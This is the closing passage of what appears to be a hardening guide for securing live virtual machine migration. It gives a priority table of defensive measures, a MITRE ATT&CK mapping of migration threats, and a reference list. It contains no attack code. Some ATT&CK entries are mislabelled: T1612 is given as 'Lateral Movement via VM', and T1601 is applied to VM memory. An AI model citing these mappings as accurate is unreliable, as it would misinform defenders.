- [ ] False positive rate is acceptable (<5%)

---

## Summary of Key Hardening Actions

| Priority | Action | Effort | Impact |
|---|---|---|---|
| P0 | Enable vMotion encryption = required / migration: secure | Low | Eliminates passive capture |
| P0 | Dedicated migration VLAN (non-routable, no SPAN) | Medium | Network isolation |
| P1 | Firewall on migration interfaces (only peers) | Low | Limits attack surface |
| P1 | Disable insecure migration mode permanently | Low | Prevents downgrade |
| P1 | Audit logging for all migration events | Low | Detection capability |
| P2 | IPsec/WireGuard for cross-site migration | Medium | WAN encryption |
| P2 | 802.1X / MACsec on migration switch ports | Medium | Physical layer auth |
| P2 | AMD SEV / Intel TDX for sensitive VMs | Medium | Memory encryption at hardware level |
| P3 | SIEM integration with anomaly detection | High | Proactive detection |
| P3 | Automated compliance evidence collection | Medium | Audit readiness |
| P3 | Post-migration integrity verification | Low | Tamper detection |
| P3 | Secure source erasure after migration | Low | Data remanence control |

---

## MITRE ATT&CK Mapping

| Technique | ID | Relevance to Migration Security |
|---|---|---|
| Network Sniffing | T1040 | Capturing unencrypted vMotion/migration traffic |
| Man-in-the-Middle | T1557 | Intercepting and modifying migration streams |
| Data from Information Repositories | T1213 | Accessing VM memory contents during transfer |
| Transfer Data to Cloud Account | T1537 | Unauthorized cross-site migration for data theft |
| Virtualization/Sandbox Evasion | T1497 | Malware detecting migration to evade analysis |
| Modify System Image | T1601 | Modifying VM memory during migration in transit |
| Lateral Movement via VM | T1612 | Using migration to move VMs to compromised hosts |
| Exploitation of Remote Services | T1210 | Attacking migration protocols/APIs |
| Valid Accounts | T1078 | Using compromised vCenter/Proxmox creds for migration |

---

## References and Further Reading

1. VMware vSphere 8.0 Security Configuration Guide — vMotion Encryption section
2. CIS Benchmark for VMware ESXi 8.0 — Section 7 (Network)
3. NIST SP 800-125B: Secure Virtual Network Configuration for VM Protection
4. AMD SEV-SNP Whitepaper: Strengthening VM Isolation with Integrity Protection and More
5. Intel TDX Module Architecture Specification
6. RFC 7296: Internet Key Exchange Protocol Version 2 (IKEv2) — for IPsec configuration
7. RFC 8439: ChaCha20 and Poly1305 — WireGuard cryptographic basis
8. PCI DSS v4.0: Requirements 1, 4, 10, 11
9. HIPAA Security Rule 45 CFR 164.312(e)(1): Transmission Security
10. Proxmox VE Administration Guide: Migration chapter
11. QEMU Migration Internals Documentation (qemu/docs/devel/migration/)
12. IEEE 802.1AE (MACsec) and 802.1X specifications
13. MITRE ATT&CK for Enterprise: Virtualization techniques
14. strongSwan Documentation: swanctl.conf reference
15. Volatility 3 Framework Documentation: Memory forensics
